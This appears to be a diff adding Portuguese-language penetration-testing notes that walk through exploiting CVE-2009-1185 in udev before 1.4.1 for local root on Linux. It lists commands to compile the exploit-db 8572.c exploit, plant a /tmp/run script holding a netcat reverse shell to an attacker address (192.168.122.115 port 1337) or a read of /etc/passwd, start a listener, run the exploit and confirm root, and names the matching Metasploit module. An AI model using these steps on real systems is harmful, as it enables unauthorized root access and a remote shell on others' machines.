@@ -1,0 +1,50 @@
+ESCALAÇÃO DE PRIVILÉGIOS EM LINUX COM UDEV < 1.4.1
+
+CVE-2009-1185
+
+udev before 1.4.1 does not verify whether a NETLINK message originates from kernel space, which allows local users to gain privileges by sending a NETLINK message from user space.
+
+1- Verificar a Versão do udev
+
+$ udevadm --version
+
+2- Se for menor do que 1.4.1 prosseguir com a utilização 
+
+- copiar o exploit para o alvo
+
+	/usr/share/exploitdb/platforms/linux/local/8572.c
+
+- compilar 
+	
+	$ gcc -o priv 8572.c
+
+
+- criar o arquivo /tmp/run que será executado como root
+
+	echo '#!/bin/bash' >> /tmp/run
+	echo '/bin/netcat -e /bin/bash SEUIP PORTA' >> /tmp/run
+	ou
+	echo '/bin/netcat -e /bin/bash 192.168.122.115 1337' >> /tmp/run
+	ou outro comando qualquer...
+	echo 'cat /etc/passwd' >> /tmp/run
+
+- ver o processo que o udev está rodando com o comando
+
+	$ cat /proc/net/netlink
+
+- startar o netcat na sua máquina
+
+	$  nc -l -p 1337
+
+- rodar o exploit com o número do processo 
+
+	$ priv 2981
+
+- verificar o usuário no kali
+
+	$ id 
+	(root)
+
+	#### TAMBÉM É POSSÍVEL USAR UM EXPLOIT PELO MSFCONSOLE ###
+
+	use exploit/linux/local/udev_netlink
